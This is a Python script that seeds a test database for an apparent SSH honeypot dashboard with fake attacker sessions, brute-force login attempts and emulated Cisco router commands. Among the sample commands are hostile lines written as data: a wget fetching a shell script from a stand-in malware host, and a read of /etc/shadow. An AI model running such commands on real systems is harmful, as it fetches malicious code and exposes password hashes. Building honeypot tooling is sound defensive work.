"""
Seed the dashboard database with realistic test data
so we can visually verify the frontend.
"""

import os
import random
import sqlite3
import uuid
from datetime import datetime, timedelta, timezone

DB_FILE = os.path.join(os.path.dirname(__file__), "test_dashboard.db")
SCHEMA_FILE = os.path.join(os.path.dirname(__file__), "schema.sql")

# Remove old test DB
if os.path.exists(DB_FILE):
    os.remove(DB_FILE)

# Create fresh DB
db = sqlite3.connect(DB_FILE)
with open(SCHEMA_FILE) as f:
    db.executescript(f.read())

now = datetime.now(timezone.utc)

# --- Seed IPs ---
attacker_ips = [
    "45.33.32.156",
    "185.220.101.42",
    "91.92.109.87",
    "103.152.34.22",
    "192.241.222.108",
    "178.62.43.201",
    "162.142.125.46",
    "71.6.135.131",
    "89.248.172.16",
    "167.94.138.50",
    "23.129.64.150",
    "198.235.24.12",
]

# --- Cisco Commands ---
cisco_commands = [
    ("show version", True),
    ("show running-config", True),
    ("show ip interface brief", True),
    ("enable", True),
    ("show arp", True),
    ("show interfaces", True),
    ("configure terminal", True),
    ("show users", True),
    ("ping 8.8.8.8", True),
    ("show clock", True),
    ("show ip route", True),
    ("traceroute 1.1.1.1", True),
    ("show logging", True),
    ("write memory", True),
    ("exit", True),
    ("show flash:", True),
    ("wget http://malware.bad/shell.sh", False),
    ("cat /etc/shadow", False),
    ("uname -a", False),
    ("whoami", False),
]

cisco_responses = {
    "show version": """Cisco IOS Software, C2951 Software (C2951-UNIVERSALK9-M), Version 15.7(3)M5
Router uptime is 2 weeks, 3 days, 14 hours
Cisco CISCO2951/K9 (revision 1.0) with 1007616K/49152K bytes of memory.
Configuration register is 0x2102""",
    "show ip interface brief": """Interface                  IP-Address      OK? Method Status                Protocol
GigabitEthernet0/0         192.168.1.1     YES NVRAM  up                    up
GigabitEthernet0/1         10.0.0.1        YES NVRAM  up                    up
GigabitEthernet0/2         unassigned      YES NVRAM  administratively down down""",
    "show arp": """Protocol  Address          Age (min)  Hardware Addr   Type   Interface
Internet  192.168.1.1      -          0026.abcd.1234  ARPA   GigabitEthernet0/0
Internet  192.168.1.254    12         0050.5678.9abc  ARPA   GigabitEthernet0/0""",
    "enable": "",
    "exit": "",
    "show clock": "*14:23:45.000 UTC Wed Jun 4 2026",
    "ping 8.8.8.8": "Sending 5, 100-byte ICMP Echos to 8.8.8.8, timeout is 2 seconds:\n!!!!!\nSuccess rate is 100 percent (5/5), round-trip min/avg/max = 1/4/10 ms",
}

usernames = ["admin", "cisco", "root", "administrator", "user", "test", "guest"]
passwords = [
    "cisco",
    "cisco123",
    "admin",
    "password",
    "123456",
    "root",
    "admin123",
    "test",
]

# --- Generate Sessions ---
num_sessions = 85
sessions = []

for i in range(num_sessions):
    session_id = str(uuid.uuid4())[:16]
    src_ip = random.choice(attacker_ips)
    start_offset = random.randint(0, 7 * 24 * 3600)  # within 7 days
    start_time = now - timedelta(seconds=start_offset)
    duration = random.randint(10, 600)
    end_time = (
        start_time + timedelta(seconds=duration) if random.random() > 0.05 else None
    )
    username = random.choice(usernames)
    password = random.choice(passwords)

    sessions.append(
        {
            "id": session_id,
            "src_ip": src_ip,
            "start_time": start_time.isoformat(),
            "end_time": end_time.isoformat() if end_time else None,
            "username": username,
            "password": password,
        }
    )

    db.execute(
        "INSERT INTO sessions (id, src_ip, start_time, end_time, protocol, username, password) "
        "VALUES (?, ?, ?, ?, 'ssh', ?, ?)",
        (
            session_id,
            src_ip,
            start_time.isoformat(),
            end_time.isoformat() if end_time else None,
            username,
            password,
        ),
    )

    # Auth attempts (1-3 failures then 1 success)
    auth_time = start_time
    num_fails = random.randint(0, 3)
    for _ in range(num_fails):
        db.execute(
            "INSERT INTO auth_attempts (session_id, timestamp, src_ip, username, password, success) "
            "VALUES (?, ?, ?, ?, ?, 0)",
            (
                session_id,
                auth_time.isoformat(),
                src_ip,
                random.choice(usernames),
                random.choice(passwords),
            ),
        )
        auth_time += timedelta(seconds=random.randint(1, 5))

    db.execute(
        "INSERT INTO auth_attempts (session_id, timestamp, src_ip, username, password, success) "
        "VALUES (?, ?, ?, ?, ?, 1)",
        (session_id, auth_time.isoformat(), src_ip, username, password),
    )

    # Commands (3-15 per session)
    num_cmds = random.randint(3, 15)
    cmd_time = auth_time + timedelta(seconds=2)
    modes = ["user"]

    for _ in range(num_cmds):
        cmd_name, success = random.choice(cisco_commands)
        mode = modes[-1]

        if cmd_name == "enable":
            modes.append("privileged")
        elif cmd_name == "configure terminal" and mode == "privileged":
            modes.append("config")
        elif cmd_name == "exit":
            if len(modes) > 1:
                modes.pop()

        response = cisco_responses.get(
            cmd_name, "" if success else "% Unknown command or computer name"
        )

        db.execute(
            "INSERT INTO command_logs (session_id, timestamp, src_ip, command, response, success, cisco_mode) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            (
                session_id,
                cmd_time.isoformat(),
                src_ip,
                cmd_name,
                response,
                1 if success else 0,
                mode,
            ),
        )
        cmd_time += timedelta(seconds=random.randint(2, 30))

db.commit()
db.close()

print(f"✅ Seeded {num_sessions} sessions into {DB_FILE}")
print(f"   DB size: {os.path.getsize(DB_FILE) / 1024:.1f} KB")
